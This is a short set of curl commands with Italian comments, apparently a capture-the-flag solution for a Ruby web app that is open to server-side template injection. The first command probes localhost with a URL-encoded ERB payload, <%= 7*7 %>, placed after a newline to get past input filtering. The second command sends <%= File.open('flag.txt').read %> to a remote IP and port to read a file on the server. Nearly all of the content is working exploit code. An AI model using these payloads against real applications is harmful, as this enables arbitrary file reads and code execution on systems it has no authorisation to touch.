#comando di prova per verificare la SSTI
curl -i -s -k -X $'POST' \
    -H $'Host: localhost:1337' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 40' -H $'Origin: http://localhost:1337' -H $'Connection: close' -H $'Referer: http://localhost:1337/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    --data-binary $'neon=ciao%0A%3C%25%3D%207%2A7%20%25%3E\x0d\x0a' \
    $'http://localhost:1337/'

#ho ottenuto la codifica url corretta per ruby gem con chatgpt e ho trovato online la sintassi per la injection
#il comando finale sar√† <%= File.open('flag.txt').read %>

# deliberate newline in console as `\n` fails to parse
curl http://143.110.169.131:31136/ \
  -s -X POST -d 'neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E'
